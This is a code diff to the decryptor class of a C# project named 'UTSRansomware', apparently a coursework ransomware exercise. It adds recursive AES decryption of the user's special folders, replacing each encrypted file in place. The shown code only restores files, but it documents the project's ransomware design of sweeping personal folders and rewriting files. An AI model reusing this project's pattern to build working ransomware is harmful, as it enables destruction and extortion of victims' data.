@@ -13,29 +13,53 @@ namespace UTSRansomware
         private byte[] key;
         private byte[] iv;
 
+        // Creates a decryptor from given key and IV
+        // This must match the key and IV used to encrypt the files
         public Decryptor(byte[] key, byte[] iv) 
         {
             this.key = key;
             this.iv = iv;
         }
 
-        public void DecryptDirectory(string parentDirectory)
+        // Loops over special directories and decrypts all files in them
+        public void DecryptSpecialDirectories()
         {
-            string[] filePaths = Directory.GetFiles(parentDirectory);
-            string[] directoryPaths = Directory.GetDirectories(parentDirectory);
-
-            foreach (string directoryPath in directoryPaths)
+            foreach (Environment.SpecialFolder folder in Utils.specialFolders)
             {
-                DecryptDirectory(directoryPath);
-            }
-
-
-            foreach (var filePath in filePaths)
-            {
-                DecryptFile(filePath);
+                string folderPath = Environment.GetFolderPath(folder);
+                if (Directory.Exists(folderPath))
+                {
+                    DecryptDirectory(folderPath);
+                }
             }
         }
 
+        // Decrypts all files in a directory, recursviely calls istelf to decrypt files in sub directories
+        public void DecryptDirectory(string parentDirectory)
+        {
+            try
+            {
+                string[] filePaths = Directory.GetFiles(parentDirectory);
+                string[] directoryPaths = Directory.GetDirectories(parentDirectory);
+
+                foreach (string directoryPath in directoryPaths)
+                {
+                    DecryptDirectory(directoryPath);
+                }
+
+
+                foreach (var filePath in filePaths)
+                {
+                    DecryptFile(filePath);
+                }
+            } catch (Exception ex)
+            {
+                Console.WriteLine(ex.ToString());
+            }
+
+        }
+
+        // Decrypts a given file
         public void DecryptFile(string encryptedFilePath)
         {
             // Instantiate Aes and configure its settings
@@ -52,6 +76,7 @@ namespace UTSRansomware
                 ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
 
                 // Open file streams to read the encrypted file and output the decrypted file
+                // Outputs as a temp file
                 using (FileStream fsEncrypted = new FileStream(encryptedFilePath, FileMode.Open, FileAccess.Read))
                 using (FileStream fsDecrypted = new FileStream(tempFilePath, FileMode.OpenOrCreate, FileAccess.Write))
                 using (CryptoStream cs = new CryptoStream(fsEncrypted, decryptor, CryptoStreamMode.Read))
@@ -63,6 +88,7 @@ namespace UTSRansomware
                         fsDecrypted.WriteByte((byte)data);
                     }
                 }
+                // Deletes original (encrypted) file and moves temp file to original location
                 File.Delete(encryptedFilePath);
                 File.Move(tempFilePath, encryptedFilePath);
                 Console.WriteLine("Decrypted: " + encryptedFilePath);
